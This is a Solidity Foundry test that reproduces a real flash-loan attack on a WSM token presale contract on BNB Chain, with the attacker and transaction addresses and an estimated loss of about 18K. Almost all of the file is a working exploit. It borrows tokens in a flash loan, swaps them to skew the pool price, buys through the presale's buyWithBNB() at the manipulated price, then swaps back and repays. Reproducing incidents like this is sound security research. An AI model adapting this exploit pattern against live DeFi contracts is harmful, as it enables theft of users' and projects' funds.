// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";


// @KeyInfo - Total Lost : 2_517_438_179_912_631_607_253_979 WSM ≈ 18K
// Attacker : 0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32
// Attack Contract : https://bscscan.com/address/0x014eE3c3dE6941cb0202Dd2b30C89309e874B114
// Vulnerable Contract : https://bscscan.com/address/0xc0afd0e40bb3dcaebd9451aa5c319b745bf792b4
// Attack Tx : https://bscscan.com/tx/0x5a475a73343519f899527fdb9850f68f8fc73168073c72a3cff8c0c7b8a1e520

// @Analysis
// 
// Using a flash loan to cause price disparity in the BNB_WSM pool, 
// and then manipulating the price through the buyWithBNB() in the presale contract.

contract WSM is Test{
    
    Uni_Pair_V3 BNB_WSH_10000 = Uni_Pair_V3(payable(address(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E)));
    Uni_Router_V3 routerv3_ = Uni_Router_V3(payable(address(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18)));
    Uni_Pair_V3 BNB_WSH_3000 = Uni_Pair_V3(payable(address(0xf420603317a0996A3fCe1b1A80993Eaef6f7AE1a)));
    address proxy_ = address(0xFB071837728455c581f370704b225ac9eABDfa4a);

    IERC20 wshToken_;
    IWBNB bnbToken_;
    function setUp() public{
        vm.createSelectFork("bsc", 37_569_860);
        vm.deal(address(this), 0); // Preparation work，clear POC balance，ignore it
        wshToken_ = IERC20(BNB_WSH_10000.token0());
        bnbToken_ = IWBNB(payable(BNB_WSH_10000.token1()));

        wshToken_.approve(address(routerv3_), 10000000000000 ether);
        bnbToken_.approve(address(routerv3_), 10000000000000 ether);
    }

    function testExploit() public{
        console.log("1. before attack wsh token balance of this = ", wshToken_.balanceOf(address(this)));
        BNB_WSH_10000.flash(address(this), 5000000 ether, 0, "");
        console.log("8. after attack wsh token balance of this = ", wshToken_.balanceOf(address(this)));
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public{
        
        console.log("2. bnb_wsh_10000 pool wsh balance after flashloan = ", wshToken_.balanceOf(address(this)));

        Uni_Router_V3.ExactInputSingleParams memory args = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(wshToken_),
            tokenOut: address(bnbToken_),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: 5000000 ether,
            amountOutMinimum: 1,
            sqrtPriceLimitX96: 0
        });
        routerv3_.exactInputSingle(args);

        console.log("3. balance after exchanging wsh for bnb = ", bnbToken_.balanceOf(address(this)));
        bnbToken_.withdraw(bnbToken_.balanceOf(address(this)));
        

        console.log("4. [ ============= ATTACK START ============= ]");
        proxy_.call{value: address(this).balance}(abi.encodeWithSignature("buyWithBNB(uint256,bool)", 2770000, false));
        console.log("5. wsh balance after attack function buyWithBNB() = ", wshToken_.balanceOf(address(this)));
        console.log("6. [ ============= ATTACK END ============= ]");
        
        Uni_Router_V3.ExactInputSingleParams memory args2 = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(bnbToken_),
            tokenOut: address(wshToken_),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: address(this).balance,
            amountOutMinimum: 1,
            sqrtPriceLimitX96: 0
        });
        routerv3_.exactInputSingle{value: address(this).balance}(args2);

        console.log("7. repay flashloan for bnb_wsh_10000 pool");
        wshToken_.transfer(address(BNB_WSH_10000), 5000000 ether + fee0);
    }

    fallback() external payable{}
}